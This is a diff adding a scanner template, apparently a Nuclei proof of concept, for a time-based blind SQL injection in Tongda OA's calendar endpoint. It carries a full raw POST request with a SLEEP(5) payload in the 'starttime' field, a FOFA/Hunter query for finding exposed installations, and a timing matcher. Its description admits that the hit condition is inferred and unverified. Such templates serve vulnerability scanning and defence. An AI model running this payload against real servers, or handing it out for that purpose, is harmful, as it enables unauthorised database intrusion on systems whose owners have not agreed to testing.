@@ -1,0 +1,49 @@
+id: poc-337b10500512b7f22ebb
+info:
+  name: 通达OAstarttime存在后台SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/337b10500512b7f22ebb9dad2479f774
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 337b10500512b7f22ebb9dad2479f774
+    fofa: + hunter`app.name="通达 OA"`
+http:
+- raw:
+  - 'POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
+
+    Cookie: {cookie}
+
+    Connection: keep-alive
+
+    Host: {{Hostname}}
+
+    Pragma: no-cache
+
+    X-Requested-With: XMLHttpRequest
+
+    Content-Length: 154
+
+    X-WVS-ID: Acunetix-Autologin/65535
+
+    Cache-Control: no-cache
+
+    Accept: */*
+
+    Accept-Language: en-US,en;q=0.9
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+
+    starttime=1'' AND (SELECT 4569 FROM (SELECT(SLEEP(5)))iGDG) AND ''Mnbs''=''Mnbs&endtime=1598918400&view=month&condition=1'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
